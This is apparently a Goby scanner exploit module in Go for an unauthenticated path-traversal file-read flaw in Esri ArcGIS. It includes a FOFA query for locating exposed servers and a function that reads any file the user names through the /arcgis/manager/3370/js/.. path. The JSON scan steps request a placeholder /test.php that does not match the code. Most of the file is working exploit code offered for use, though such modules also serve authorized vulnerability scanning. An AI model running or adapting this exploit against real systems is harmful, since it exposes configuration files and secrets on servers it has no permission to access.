package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ArcGIS Geographic Information System /arcgis/manager/3370/js File Read Vulnerability",
    "Description": "<p>ArcGIS is a geographic information system (GIS) software developed by Esri, an American company. It integrates mainstream IT technologies such as database, software engineering, artificial intelligence, network technology, and cloud computing, and aims to provide users with a complete and open enterprise-level GIS solution. It includes a set of Windows desktop applications with user interface components. It can achieve simple to complex geographic information system (GIS) tasks, such as mapping, geographic analysis, data editing, data management, visualization, and spatial processing.</p>",
    "Product": "esri-ArcGIS",
    "Homepage": "https://www.esri.com/zh-cn/arcgis/about-arcgis/overview",
    "DisclosureDate": "2024-11-04",
    "PostTime": "2024-11-04",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"esri/discovery/admin.js\" && body!=\"GeoScene\"",
    "GobyQuery": "body=\"esri/discovery/admin.js\" && body!=\"GeoScene\"",
    "Level": "1",
    "Impact": "<p>Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143479017?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "ArcGIS地理信息系统 /arcgis/manager/3370/js 文件读取漏洞",
            "Product": "esri-ArcGIS",
            "Description": "<p>ArcGIS是由美国Esri公司研发的地理信息系统（GIS）软件，它整合了数据库、软件工程、人工智能、网络技术、云计算等主流的IT技术，旨在为用户提供一套完整的、开放的企业级GIS解决方案，它包含了一套带有用户界面组件的Windows桌面应用。可以实现从简单到复杂的地理信息系统(GIS)任务，如制图、地理分析、数据编辑、数据管理、可视化和空间处理等。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ArcGIS Geographic Information System /arcgis/manager/3370/js File Read Vulnerability",
            "Product": "esri-ArcGIS",
            "Description": "<p>ArcGIS is a geographic information system (GIS) software developed by Esri, an American company. It integrates mainstream IT technologies such as database, software engineering, artificial intelligence, network technology, and cloud computing, and aims to provide users with a complete and open enterprise-level GIS solution. It includes a set of Windows desktop applications with user interface components. It can achieve simple to complex geographic information system (GIS) tasks, such as mapping, geographic analysis, data editing, data management, visualization, and spatial processing.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	postOrGet_zasqefasf123asdfafe1412afdawaq := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		getRequestConfig := httpclient.NewGetRequestConfig("/arcgis/manager/3370/js/.." + fileUrl)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/arcgis/manager/3370/js/../WEB-INF/web.xml"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/WEB-INF/web.xml": "web-app",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"/WEB-INF/web.xml", "web-app"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
